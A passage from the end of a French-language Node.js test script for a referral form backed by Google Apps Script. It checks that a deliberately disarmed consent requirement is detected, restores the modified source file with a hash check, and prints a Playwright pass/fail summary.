        votre_nom: "ZZ Referent", votre_email: "zztest@exemple.ca", votre_lien: "Ami ou famille"
      }) } });
      const r = JSON.parse(sortie.getContent());
      dire("DÉSARMÉ · le service accepte une référence SANS acceptation", r.success, true, r.message || "");
      const fD = mod.etat.feuilles.get(ONGLET);
      const iAcc = fD.valeurs[0].indexOf("Conditions acceptées");
      dire("DÉSARMÉ · la ligne s'écrit, colonne d'acceptation vide",
        String(fD.valeurs[1][iAcc] == null ? "" : fD.valeurs[1][iAcc]), "");
    } finally {
      fs.writeFileSync(CHEMIN, original);
      const apres = crypto.createHash("sha256").update(fs.readFileSync(CHEMIN)).digest("hex");
      if (apres !== empreinte) {
        arret("`google/Code.gs` N'A PAS ÉTÉ RESTAURÉ — empreinte " + apres.slice(0, 12)
          + " au lieu de " + empreinte.slice(0, 12)
          + ". RESTAUREZ-LE À LA MAIN : git checkout -- google/Code.gs");
      }
      console.log("       · `google/Code.gs` restauré, empreinte identique ("
        + empreinte.slice(0, 12) + "…)");
    }
  }
}

/* ============================================================
   LE COMPTE
   ============================================================ */
await nav.close();
srv.close();

console.log("");
console.log("============================================================");
if (ko) {
  console.log("LA RÉFÉRENCE NE TIENT PAS : " + ko + " échec(s) sur " + n);
  echecs.forEach((e) => console.log("  · " + e));
} else {
  console.log("LA RÉFÉRENCE TIENT : " + n + " / " + n);
}
console.log("RÉSERVE : Chromium/Playwright, machine de bureau Windows.");
console.log("          Aucun relevé ne vient d'un appareil réel, y compris ceux en 390 px.");
console.log("============================================================");
process.exit(ko ? 1 : 0);
